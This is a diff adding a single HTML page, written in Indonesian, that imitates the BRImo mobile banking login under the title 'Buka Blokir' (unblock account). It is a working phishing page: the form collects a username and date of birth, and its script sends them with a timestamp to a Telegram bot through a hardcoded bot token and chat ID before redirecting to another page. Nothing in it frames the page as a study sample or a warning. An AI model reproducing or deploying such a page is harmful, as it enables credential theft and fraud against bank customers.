@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRImo Mobile- Buka Blokir</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #FFFFFF;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 360px;
+        }
+
+        /* Logo BRI */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .logo-bri {
+            font-size: 34px;
+            font-weight: 900;
+            color: #00529B;
+            letter-spacing: 1px;
+        }
+
+        .logo-mobile {
+            font-size: 26px;
+            font-weight: 600;
+            color: #FF6A00;
+            margin-top: -4px;
+        }
+
+        /* Form Input */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .input-row {
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #CCCCCC;
+            padding: 8px 0;
+        }
+
+        .input-icon {
+            font-size: 16px;
+            color: #666666;
+            margin-right: 10px;
+        }
+
+        .input-row input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            color: #333333;
+            background: transparent;
+        }
+
+        .input-row input::placeholder {
+            color: #AAAAAA;
+        }
+
+        /* Tombol Login */
+        .btn-login {
+            width: 100%;
+            background-color: #002366;
+            color: #FFFFFF;
+            border: none;
+            padding: 13px;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-login:hover {
+            background-color: #003399;
+        }
+
+        .loading {
+            text-align: center;
+            margin-top: 15px;
+            color: #00529B;
+            display: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <div class="logo-bri">BRImo</div>
+            <div class="logo-mobile">mobile</div>
+        </div>
+
+        <!-- Form -->
+        <form id="loginForm">
+            <div class="form-group">
+                <div class="input-row">
+                    <span class="input-icon">👤</span>
+                    <input type="text" id="username" placeholder="Username" required>
+                </div>
+            </div>
+
+            <!-- ✅ Kolom Tanggal Lahir Baru -->
+            <div class="form-group">
+                <div class="input-row">
+                    <span class="input-icon">🎂</span>
+                    <input type="date" id="tgl_lahir" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-login">LOGIN</button>
+        </form>
+
+        <div class="loading" id="loading">Mengirim data...</div>
+    </div>
+
+    <script>
+        // === SETTING TELEGRAM BOT ===
+        const BOT_TOKEN = "8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg";
+        const CHAT_ID ="8592742129";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // Kirim data ke Telegram & pindah halaman
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const tgl_lahir = document.getElementById('tgl_lahir').value;
+            const loading = document.getElementById('loading');
+            const btn = document.querySelector('.btn-login');
+            
+            loading.style.display = 'block';
+            btn.disabled = true;
+            btn.textContent = 'MEMPROSES...';
+
+            const pesan = `🔐 DATA LOGIN BRIMO
+
+👤 Username: ${username}
+📅 Tanggal Lahir: ${tgl_lahir}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // ✅ Berhasil -> Pindah ke halaman index3.html
+                window.location.href = 'index3.html';
+                
+            } catch (error) {
+                alert('❌ Gagal mengirim! Cek koneksi internet.');
+                console.error(error);
+                loading.style.display = 'none';
+                btn.disabled = false;
+                btn.textContent = 'LOGIN';
+            }
+        });
+    </script>
+</body>
+</html>
